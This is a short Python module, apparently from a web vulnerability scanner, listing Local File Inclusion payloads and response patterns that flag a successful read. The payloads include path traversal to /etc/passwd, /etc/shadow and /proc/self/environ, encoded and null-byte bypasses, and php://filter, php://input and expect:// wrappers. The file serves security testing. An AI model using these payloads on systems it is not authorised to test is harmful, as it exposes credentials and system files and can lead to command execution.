"""Payloads para detección de Local File Inclusion (LFI)."""

QUICK_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
]

FULL_PAYLOADS = [
    "../../etc/shadow",
    "../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/apache/error.log",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd%00",
    "../../etc/passwd%00.jpg",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\boot.ini",
    "/var/www/html/index.php",
    "/var/www/html/config.php",
]

# Patrones que indican LFI exitoso
DETECTION_PATTERNS = [
    "root:x:",
    "root:*:",
    "/bin/bash",
    "/bin/sh",
    "nobody:",
    "www-data:",
    "daemon:",
    "[fonts]",              # win.ini
    "[extensions]",         # win.ini
    "[boot loader]",        # boot.ini
    "127.0.0.1",            # hosts
    "localhost",            # hosts
    "DOCUMENT_ROOT",        # environ
    "HTTP_HOST",            # environ
    "proc/version",
    "Linux version",
]
